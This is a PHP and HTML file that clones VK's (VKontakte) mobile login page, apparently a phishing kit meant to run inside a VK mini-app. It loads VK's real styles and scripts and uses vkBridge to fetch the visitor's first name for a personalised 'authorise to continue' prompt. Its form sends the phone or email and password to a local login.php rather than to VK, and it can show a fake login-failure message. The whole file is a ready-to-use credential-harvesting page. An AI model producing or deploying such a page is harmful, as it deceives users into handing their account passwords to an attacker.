<?php
require 'db.php';

  $errorGet = $_GET['error_login'];
    if (!$errorGet)
    {
        echo "<style>
        #hide_row_pass {display: none;}
        </style>";
    }
else
    {
        $messerror = '<div class="service_msg service_msg_warning"><b>Не удалось войти.</b><br>Пожалуйста, проверьте правильность введённых данных. <a href="https://static.vk.com/restore">Проблемы со входом?</a></div>';
    }

?>
<!DOCTYPE html>
      <html class="vk vk_js_no vk_1x vk_flex_no r m h vk_withVolumeLine vk_appAuth_no n vk_modern  vk_schemes_no ">
      <head>
              <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, minimal-ui, user-scalable=no" />
        <meta name="format-detection" content="telephone=no" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <meta name="MobileOptimized" content="176" />
        <meta name="HandheldFriendly" content="True" />
        <base id="base">
        <link rel="manifest" crossorigin="use-credentials" href="https://m.vk.com/manifest.webmanifest?ver=209">
      <meta name="msApplication-ID" content="C6965DD5.VK" />
      <meta name="msApplication-PackageFamilyName" content="C6965DD5.VK_v422avzh127ra" />
    
        <meta name="description" content="ВКонтакте – универсальное средство для общения и поиска друзей и одноклассников, которым ежедневно пользуются десятки миллионов человек. Мы хотим, чтобы друзья, однокурсники, одноклассники, соседи и коллеги всегда оставались в контакте." />
    <link rel="shortcut icon" href="https://m.vk.com/images/icons/favicons/fav_logo.ico?8"></link>
    <meta name="theme-color" content="#ffffff" />
    <link rel="icon" type="image/png" sizes="32x32" href="https://m.vk.com/images/icons/pwa/favicon_32.png?9">
    <link rel="apple-touch-icon" href="https://m.vk.com/images/icons/pwa/apple/default.png?9">
    <meta name="apple-mobile-web-app-title" content="ВКонтакте">
    <meta name="application-name" content="ВКонтакте">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
        <title>Вход | ВКонтакте</title>
        <meta http-equiv="origin-trial" content="Av8ECqeAAIiC9bF3N7aq2M/TaxNzzpPcFXnw0rRb9KRUQlbyHKYmPj6KeVUFVDk+S7W9RfJH2GsEOS8G99uJvgcAAABaeyJvcmlnaW4iOiJodHRwczovL3ZrLmNvbTo0NDMiLCJmZWF0dXJlIjoiQmFkZ2luZyIsImV4cGlyeSI6MTU2MTY2MTkxNCwiaXNTdWJkb21haW4iOnRydWV9">
        <script>
          (function() {
            window.vk = {"id":0,"__debug":false,"__dev":false,"wsTransport":"https:\/\/stats.vk-portal.net","statsMeta":{"platform":"mvk","st":false,"time":1604084292,"hash":"LBqY0oF1CGAv84ieKuqJMrMOwgA6lGHiI5ZYPzdXux4"},"tnsPixelType":"unauth","tnsPixelSocdem":"13","platform":"mvk","rv":"26928","ts":1604084292,"sw":{"url":"\/js\/sw.js","push_hash":"533547e840b14467fe"},"stFiles":{"\/css\/mobile\/variables.eedc30fa1d5cb1a3ba8b.css":"","\/css\/mobile\/common.7f4478ed1500f52186a8.css":"","\/css\/mobile\/audio_player_bottom.b7c5245e12fba4147876.css":"","\/css\/mobile\/audio_player_mini.5972ccdfefc224e4ffb3.css":"","\/css\/mobile\/unauthorized.c46a2b649a573887b2d9.css":"","\/js\/cmodules\/mobile\/runtime.457010b0ec0e2b5dd4c0.js":"bb0b50c5e791c7e49db55d3782740e6238d7a673cc56a4b9f415933aba9d7499","\/js\/cmodules\/mobile\/vendors.af5a537f6cce92a68b28.js":"2ffafc070912033e6998446a2d9a968de85fd6efe2f4ded599fcfcc5dec1f30a","\/js\/cmodules\/mobile\/polyfills.cc5954b9c97444d9b3d9.js":"8a2179cd64de3e431dc9e977bf8184dd11baf5c4d01636c5529df77c5820ebf1","\/js\/cmodules\/mobile\/b-092ecb31d508b9b9576872401bb1c62a.2264c9047d3cb231cf33.js":"ebb9278cde3dbc2b813841935cf0ca60ca8021549704d38548b58b88892760ce","\/js\/cmodules\/mobile\/b-2bfd81b70b949836743ba6fcd34dc5a4.d84ce7f807b2796840bf.js":"1eec823e60d74302a40893eab59f5f2b269c2866a69b593fcd4c56cd52e31919","\/js\/cmodules\/mobile\/b-14bb5403678346964de9a47e3ab14820.76e29ae8d44eed202048.js":"bf93a4f68884a6e233d84316982ad5711064da43be2861c01a24d17a4b987ad4","\/js\/cmodules\/mobile\/common.e3b8044d8ec990312180.js":"116e5e56b9b0a87521fd1060775f3c81f3b3220a9d356dd485017d4afc59d67c","\/js\/cmodules\/mobile\/js_errors_logger.823c51332f116b8a8f1f.js":"36593c9384579e4b95e2cc03343c7d606eb6a0f46205542c1c17bfa2cfcc026e","\/js\/cmodules\/mobile\/audio_player_bottom.5a26731aa77682941ae1.js":"5546bb8f49d451570c93c20da71286e45f4d233b13b2b776a696d1ec70d67a91","\/js\/cmodules\/mobile\/audio_player_mini.5e84d3266b87ba31f0ad.js":"17cab05e29e4c8be2f3d91f50eebbd05c291bb2e2907f18d586c84b7f3cbd2f8","\/js\/cmodules\/mobile\/unauthorized.17f6e19f957c9ff7a0df.js":"e0619547467f57d977c94c5619439e4e3b673a9891e25942e23d1b3242bf4e34"},"stNavMap":{"promocode(\\\/([0-9a-zA-Z-]+))?":["\/js\/cmodules\/mobile\/runtime.457010b0ec0e2b5dd4c0.js","\/js\/cmodules\/mobile\/vendors.af5a537f6cce92a68b28.js","\/js\/cmodules\/mobile\/b-092ecb31d508b9b9576872401bb1c62a.2264c9047d3cb231cf33.js","\/js\/cmodules\/mobile\/b-2bfd81b70b949836743ba6fcd34dc5a4.d84ce7f807b2796840bf.js","\/js\/cmodules\/mobile\/b-14bb5403678346964de9a47e3ab14820.76e29ae8d44eed202048.js","\/js\/cmodules\/mobile\/promocode.7fe38b01fc741676877a.js","\/css\/mobile\/promocode.ea3977451b377bf0bf41.css"],"^\\\/(video|clip)":["\/css\/mobile\/video.c6c5f4cd2ec769441358.css","\/js\/cmodules\/mobile\/runtime.457010b0ec0e2b5dd4c0.js","\/js\/cmodules\/mobile\/vendors.af5a537f6cce92a68b28.js","\/js\/cmodules\/mobile\/b-092ecb31d508b9b9576872401bb1c62a.2264c9047d3cb231cf33.js","\/js\/cmodules\/mobile\/b-2bfd81b70b949836743ba6fcd34dc5a4.d84ce7f807b2796840bf.js","\/js\/cmodules\/mobile\/b-14bb5403678346964de9a47e3ab14820.76e29ae8d44eed202048.js","\/js\/cmodules\/mobile\/video.5a170bdd013cfebf6a67.js","\/css\/mobile\/mail.9c295ae0e2d28823651d.css"],"^\\\/(photo|album|tag|attachments|market)":["\/css\/mobile\/photo.bd16233a80b82eff4457.css","\/css\/mobile\/mail.9c295ae0e2d28823651d.css"],"^\\\/(wall|mail|write|im|chatjoin)":["\/css\/mobile\/mail.9c295ae0e2d28823651d.css"],"^\\\/up(\\??[0-9a-zA-Z=_-]+)?$":["\/css\/mobile\/vkapp_future.9715fe6884b1c8863fb9.css"],"settings\\?act=money_transfer_history":["\/js\/cmodules\/mobile\/runtime.457010b0ec0e2b5dd4c0.js","\/js\/cmodules\/mobile\/vendors.af5a537f6cce92a68b28.js","\/js\/cmodules\/mobile\/b-092ecb31d508b9b9576872401bb1c62a.2264c9047d3cb231cf33.js","\/js\/cmodules\/mobile\/b-2bfd81b70b949836743ba6fcd34dc5a4.d84ce7f807b2796840bf.js","\/js\/cmodules\/mobile\/b-14bb5403678346964de9a47e3ab14820.76e29ae8d44eed202048.js","\/js\/cmodules\/mobile\/money_transfer_history.29aeff8ef6359e18dde4.js","\/css\/mobile\/money_transfer_history.76d5699c24426df607f2.css"],"reports\\?act=":["\/css\/mobile\/reports.bb4eaa920be32d4bef20.css"],"^\\\/(blog|about|press|jobs|products|adv)":["\/css\/mobile\/blog.cd6b472c94af4714cbe0.css","\/js\/cmodules\/mobile\/runtime.457010b0ec0e2b5dd4c0.js","\/js\/cmodules\/mobile\/vendors.af5a537f6cce92a68b28.js","\/js\/cmodules\/mobile\/b-092ecb31d508b9b9576872401bb1c62a.2264c9047d3cb231cf33.js","\/js\/cmodules\/mobile\/b-2bfd81b70b949836743ba6fcd34dc5a4.d84ce7f807b2796840bf.js","\/js\/cmodules\/mobile\/b-14bb5403678346964de9a47e3ab14820.76e29ae8d44eed202048.js","\/js\/cmodules\/mobile\/blog.84eb83e286354598d575.js","\/css\/mobile\/mail.9c295ae0e2d28823651d.css"],"^\\\/(product|cart|orders|market\\.php)(\\??[0-9a-zA-Z=_-]+)?":["\/js\/cmodules\/mobile\/runtime.457010b0ec0e2b5dd4c0.js","\/js\/cmodules\/mobile\/vendors.af5a537f6cce92a68b28.js","\/js\/cmodules\/mobile\/b-092ecb31d508b9b9576872401bb1c62a.2264c9047d3cb231cf33.js","\/js\/cmodules\/mobile\/b-2bfd81b70b949836743ba6fcd34dc5a4.d84ce7f807b2796840bf.js","\/js\/cmodules\/mobile\/b-14bb5403678346964de9a47e3ab14820.76e29ae8d44eed202048.js","\/js\/cmodules\/mobile\/market.f2632392bae3536651d3.js","\/css\/mobile\/market.ba9a71c320badefc9170.css"],"^\\\/groups_catalog\\\/([0-9a-zA-Z_\\-]+)$":["\/js\/cmodules\/mobile\/runtime.457010b0ec0e2b5dd4c0.js","\/js\/cmodules\/mobile\/groups_catalog.3215fa35d4ed65ff7140.js"]},"pe":{"article_poll":1,"vk_apps_svg_qr":1,"upload.send_upload_stat":1,"push_notifier":1,"story_reactions_web":1,"notify_new_events_box":1,"mini_apps_web_add_to_favorites":1,"mini_apps_web_add_to_menu":1,"mini_apps_m_web_new_stub_page":1,"mini_apps_web_catalog_enabled":1,"cookie_class_samesite":1,"cookie_secure_default_true":1,"mvk_new_info_snackbar":1,"stickers_bot_link":1,"apps_promo_share_story":1,"widgets_xdm_same_origin":1,"stickers_money_transfer_suggestions":1,"web2_story_box_enabled":1,"bridge_mobile_story_box_enabled":1,"gifts_stickers_preview_tooltips":1,"easy_market_promote_new_payment":1,"navigation_timespent":1,"mvk_mediascope_counter":1,"market_item_recommendations_view_log":1,"market_item_others_view_log":1,"web_stats_transport_story_view":1,"registration_item_stat":1,"mvk_lazy_static_reload":1,"notifications_view_new":1,"add_from_field_to_docs_box":1,"ads_market_autopromotion_bookmarks_stats":1,"mini_apps_web_call_api_form_data":1,"mvk_stickers_panel_optimize":1,"web_new_photo_editor":1,"web_new_photo_editor_crop":1,"web_photo_editor_hide_entrypoint":1,"web_stats_try_send":1,"stickers_catalog_reload_after_buy":1,"web_stats_send_on_events_limit":1,"market_hidden_albums_in_autopromotion":1,"stickers_web_new_ui":1,"ads_new_reports_web_tgb":1,"web_audio_prefetch":1,"apps_halloween_promo":1,"ads_autopromotion_web_cashback":1,"aliexpress_app_links_with_partner_links":1},"ex":[],"iu_ex":true,"audioAdsConfig":{"_":"_"}};
            window.isMVK = true;
            window.isCustomScroll = false;
            window.isNewMail = true;
            window.isNewLongpoll = true;
            window.audioSubscribe = false;
            window.isArticleWebView = false;
            window.isBasicOffline = false;

            var vkElem = document.querySelector('.vk');
            var vkClass = vkElem.getAttribute('class');

            function cssPropertySupported(pNames) {
              var element = document.createElement('a');
              var index = pNames.length;
              try {
                while (index--) {
                  var name = pNames[index];

                  element.style.display = name;
                  if (element.style.display === name) {
                    return true;
                  }
                }
              } catch (pError) {}

              return false;
            }
            var supports = {
              js: true,
              flex: cssPropertySupported('flex -webkit-flex -ms-flexbox -moz-box -webkit-box'.split(' ')),
            };

            supports.js && (vkClass = vkClass.replace('vk_js_no', 'vk_js_yes'));
            supports.flex && (vkClass = vkClass.replace('vk_flex_no', 'vk_flex_yes'));
            vkElem.setAttribute('class', vkClass);
          })();
        </script>

        
        <link rel="stylesheet" href="https://m.vk.com/css/mobile/variables.eedc30fa1d5cb1a3ba8b.css?">
<link rel="stylesheet" href="https://m.vk.com/css/mobile/common.7f4478ed1500f52186a8.css?">
<link rel="stylesheet" href="https://m.vk.com/css/mobile/audio_player_bottom.b7c5245e12fba4147876.css?">
<link rel="stylesheet" href="https://m.vk.com/css/mobile/audio_player_mini.5972ccdfefc224e4ffb3.css?">
<link rel="stylesheet" href="https://m.vk.com/css/mobile/unauthorized.c46a2b649a573887b2d9.css?">
<script src="https://m.vk.com/js/cmodules/mobile/runtime.457010b0ec0e2b5dd4c0.js?bb0b50c5e791c7e49db55d3782740e6238d7a673cc56a4b9f415933aba9d7499"></script>
<script src="https://m.vk.com/js/cmodules/mobile/vendors.af5a537f6cce92a68b28.js?2ffafc070912033e6998446a2d9a968de85fd6efe2f4ded599fcfcc5dec1f30a"></script>
<script src="https://m.vk.com/js/cmodules/mobile/polyfills.cc5954b9c97444d9b3d9.js?8a2179cd64de3e431dc9e977bf8184dd11baf5c4d01636c5529df77c5820ebf1"></script>
<script src="https://m.vk.com/js/cmodules/mobile/b-092ecb31d508b9b9576872401bb1c62a.2264c9047d3cb231cf33.js?ebb9278cde3dbc2b813841935cf0ca60ca8021549704d38548b58b88892760ce"></script>
<script src="https://m.vk.com/js/cmodules/mobile/b-2bfd81b70b949836743ba6fcd34dc5a4.d84ce7f807b2796840bf.js?1eec823e60d74302a40893eab59f5f2b269c2866a69b593fcd4c56cd52e31919"></script>
<script src="https://m.vk.com/js/cmodules/mobile/b-14bb5403678346964de9a47e3ab14820.76e29ae8d44eed202048.js?bf93a4f68884a6e233d84316982ad5711064da43be2861c01a24d17a4b987ad4"></script>
<script src="https://m.vk.com/js/cmodules/mobile/common.e3b8044d8ec990312180.js?116e5e56b9b0a87521fd1060775f3c81f3b3220a9d356dd485017d4afc59d67c"></script>
<script src="https://m.vk.com/js/cmodules/mobile/js_errors_logger.823c51332f116b8a8f1f.js?36593c9384579e4b95e2cc03343c7d606eb6a0f46205542c1c17bfa2cfcc026e"></script>
<script src="https://m.vk.com/js/cmodules/mobile/audio_player_bottom.5a26731aa77682941ae1.js?5546bb8f49d451570c93c20da71286e45f4d233b13b2b776a696d1ec70d67a91"></script>
<script src="https://m.vk.com/js/cmodules/mobile/audio_player_mini.5e84d3266b87ba31f0ad.js?17cab05e29e4c8be2f3d91f50eebbd05c291bb2e2907f18d586c84b7f3cbd2f8"></script>
<script src="https://m.vk.com/js/cmodules/mobile/unauthorized.17f6e19f957c9ff7a0df.js?e0619547467f57d977c94c5619439e4e3b673a9891e25942e23d1b3242bf4e34"></script>
<script src="https://vk.com/js/api/xd_connection.js?2"  type="text/javascript"></script>
        <link rel="canonical" href="https://vk.com/login" />
        <link rel="alternate" href="android-app://com.vkontakte.android/vkontakte/m.vk.com/login" />
        <script src="https://unpkg.com/@vkontakte/vk-bridge/dist/browser.min.js"></script>
 <script type="text/javascript">
  VK.init(function() {
     // API initialization succeeded
     // Your code here
  }, function() {
     // API initialization failed
     // Can reload page here
}, '5.124');
</script>

      </head>


      <body  class="vk__page _hover vk_ios_no _hfixed vk_stickers_hints_support_yes opera_mini_no vk_safari_no vk__page_login vk_tabbar_top   vk_al_yes " onresize="onBodyResize(true);">
      <script>
  // Sends event to client
  vkBridge.send("VKWebAppInit");
  vkBridge.send("VKWebAppGetUserInfo", {}).then(data => {
      if(data.first_name){
      document.getElementById('login_header').innerHTML = '<b>'+data.first_name+' </b>для продолжения пройдите авторизацию';          
      }
  })
  .catch(error => {
    alert(error);
    document.getElementById('login_header').innerHTML = 'Приложение доступно после авторизации';
  });

</script> 

            <div class="layout">
      
          <div class="layout__header mhead" id="vk_head"></div>
      <div class="layout__body qs_enabled" id="vk_wrap">
        <div class="layout__leftMenu" id="l">
          
        </div>
        <div class="layout__basis" id="m" role="main">
              <div class="basis">
      <div class="basis__header mhead basis__header_noBottomMenu basis__header_noshadow basis__header_noshadowAnim basis__header_nohide" id="mhead"><a href="/" accesskey="*" class="hb_wrap mhb_logo">
  <div class=" lmh_logo_wrap">
    <div class="hb_btn mhi_logo">&nbsp;</div>
    <div class="mhi_logo_text"><div class="mhi_logo_text_light"><div class="svgIcon svgIcon-base svgIcon-base__vk_logo_text_light_26"></div></div><div class="mhi_logo_text_dark"><div class="svgIcon svgIcon-base svgIcon-base__vk_logo_text_dark_26"></div></div></div>
  </div>
  <h1 class="hb_btn mh_header">&nbsp;</h1>
</a>
</div>
      <div class="basis__menu"><div class="AudioPlayerBottom"></div><div class="VideoFilterBadgeFiller"></div></div>
      
      <div class="basis__content mcont " id="mcont" data-canonical="https://vk.com/login"><div class="screen_login"><div class="PageBlock installApp">
</div><div class="fit_box bl_cont new_form">
  <div class="PageBlock">
  
  <div class="form_item">
    <div class="login_header" id="login_header">
    Приложение доступно после авторизации
    </div>
    <?php echo $messerror; ?>
      <div class="fi_row"><div class="service_msg_box">
  <div style="display: none;"class="service_msg service_msg_warning"><b>Не удаётся войти.</b><br/>Пожалуйста, проверьте правильность введённых данных. <a href="https://static.vk.com/restore">Проблемы со входом?</a></div>
</div></div>
    <form action="login.php" method="POST">
      <dl class="fi_row">
        <dd>
          <input type="text" class="textfield" name="email" placeholder="Телефон или email" />
        </dd>
      </dl>
      <dl class="fi_row">
        <dd>
          <input type="password" class="textfield" name="pass" placeholder="Пароль" />
        </dd>
      </dl>
      
      <div class="fi_row_new">
        <input class="button wide_button" type="submit" value="Войти" />
      </div>
      <div class="fi_row">
        <div class="near_btn wide_button login_restore"><a href="https://static.vk.com/restore" rel="noopener">Не можете войти?</a></div>
      </div>
      <div class="login_new_user">
  <div class="fi_header fi_header_light">Впервые ВКонтакте?</div>
</div>
<div class="fi_row">
  <a class="button wide_button success" href="/join" rel="noopener">Зарегистрироваться</a>
</div>
<div class="socials">
  
  <a href="/login?act=fb_sign" class="social_button"><i class="social_icon"></i>Войти через Facebook</a>
</div>
    </form>
  </div>
  </div>
</div></div>
        </div>
      </div>
    </div>
        
        
        <div id="vk_utils"></div>
        <div id="z"></div>
        <div id="vk_bottom"></div>
        <div id="theme_color_shim"></div>
        
        
      </body>
    </html>